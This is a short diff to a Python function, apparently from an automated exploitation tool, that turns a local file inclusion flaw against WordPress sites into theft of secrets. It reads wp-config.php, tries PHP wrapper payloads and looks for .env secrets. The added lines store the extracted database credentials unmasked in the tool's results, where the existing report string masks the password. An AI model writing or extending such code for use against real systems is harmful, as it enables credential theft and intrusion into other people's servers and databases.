@@ -329,6 +329,8 @@ def _weaponize_lfi(boot, res, step_fn) -> dict:
             "impact": (f"wp-config.php exfiltrated: DB_USER={db_credentials.get('DB_USER','?')}, "
                        f"DB_PASSWORD={'***' if db_credentials.get('DB_PASSWORD') else 'not found'}, "
                        f"table_prefix={db_credentials.get('table_prefix','wp_')}"),
+            "file_read_success": True,
+            "db_credentials_extracted": {k.lower(): v for k, v in db_credentials.items()},
         }
 
     # --- PHP wrapper escalation ---
@@ -379,6 +381,7 @@ def _weaponize_lfi(boot, res, step_fn) -> dict:
                            f"DB_USER={_php_creds.get('DB_USER','?')}, "
                            f"table_prefix={_php_creds.get('table_prefix','wp_')}"),
                 "file_read_success": True,
+                "db_credentials_extracted": {k.lower(): v for k, v in _php_creds.items()},
             }
         elif "DATABASE_URL" in _decoded or "SECRET_KEY" in _decoded or "JWT_SECRET" in _decoded:
             _step(step_fn, f"PHP wrapper LFI SUCCESS (.env) via {_wrapper_payload[:60]!r}")
